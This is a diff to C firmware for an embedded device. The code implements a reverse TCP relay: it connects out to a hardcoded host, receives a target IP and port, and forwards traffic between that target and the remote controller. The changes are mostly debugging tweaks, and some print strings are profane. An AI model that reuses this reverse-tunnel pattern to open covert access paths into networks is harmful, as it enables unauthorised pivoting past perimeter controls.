@@ -13,6 +13,8 @@
 #define R_HOST "192.168.43.240"
 #define R_PORT 8080
 
+char __attribute__((aligned(4))) buffer[BUFFER_SIZE];
+
 
 int create_socket(char *_server, int _port) {
   int sockfd;
@@ -38,7 +40,7 @@ int create_socket(char *_server, int _port) {
   }
   serverSockAddr.sin_port = htons(_port);
   serverSockAddr.sin_family = AF_INET;
-  printf("Pre Conn %s:%d", _server, _port);
+  printf("Pre Conn %s:%d\n", _server, _port);
   if ( (sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0) {
     printf("failed to create socket {%d}\n", sockfd);
     return -1;
@@ -56,7 +58,6 @@ int create_socket(char *_server, int _port) {
 void reverse_tcp_task(void *pvParameters) {
     int __attribute__((aligned(4))) remote;
     struct __attribute__((aligned(4))) sockaddr_in remote_addr;
-    char __attribute__((aligned(4))) buffer[BUFFER_SIZE];
     int __attribute__((aligned(4))) bytes_received;
 
     retr:
@@ -75,7 +76,8 @@ void reverse_tcp_task(void *pvParameters) {
     printf("CONNECTED!!!\n\n");
 
     while (1) {
-        bytes_received = recv(remote, buffer, BUFFER_SIZE, 0);
+        printf("Waiting from remote\n");
+        bytes_received = read(remote, buffer, BUFFER_SIZE);
         if (bytes_received <= 0) {
             break;
         }
@@ -113,7 +115,7 @@ void reverse_tcp_task(void *pvParameters) {
             client = create_socket(ip,port);
 
             if (client < 0){
-              printf("FUCK CLINET");
+              printf("FUCK CLINET\n");
               return 1;
             }
 
@@ -132,27 +134,29 @@ void reverse_tcp_task(void *pvParameters) {
                 }
 
                 if (FD_ISSET(client, &read_fds)) {
-                    bytes_received = recv(client, buffer, BUFFER_SIZE, 0);
+                    bytes_received = read(client, buffer, BUFFER_SIZE);
                     if (bytes_received <= 0 || write(remote, buffer, bytes_received) <= 0) {
                         printf("FIRST break;\n");
+                        memset(buffer,0,BUFFER_SIZE);
                         break;
                     }
                 }
 
                 if (FD_ISSET(remote, &read_fds)) {
-                    bytes_received = recv(remote, buffer, BUFFER_SIZE, 0);
+                    bytes_received = read(remote, buffer, BUFFER_SIZE);
                     if (bytes_received <= 0 || strncmp(buffer, "CLOSE", 5) == 0 || write(client, buffer, bytes_received) <= 0) {
                         printf("Second break;\n");
+                        memset(buffer,0,BUFFER_SIZE);
                         break;
                     }
                 }
                 
-                vTaskDelay(100 / portTICK_PERIOD_MS );
+                //vTaskDelay(1 / portTICK_PERIOD_MS ); 
             }
-            printf("CLOSEMEFUCK!\n");
+            printf("Closing socket!\n");
             close(client);
         }
-        printf("WTF???\n");
+        printf("Waiting to restart reading???\n");
         vTaskDelay(100 / portTICK_PERIOD_MS );
         
     }
@@ -164,5 +168,5 @@ void reverse_tcp_task(void *pvParameters) {
 
 
 void start_reverse_tcp(const char * _server, int _port) {
-  xTaskCreate(reverse_tcp_task, (const char *)"reverse_tcp_task", 6000, NULL, 1, NULL);
+  xTaskCreate(reverse_tcp_task, (const char *)"reverse_tcp_task", 512, NULL, 1, NULL);
 }
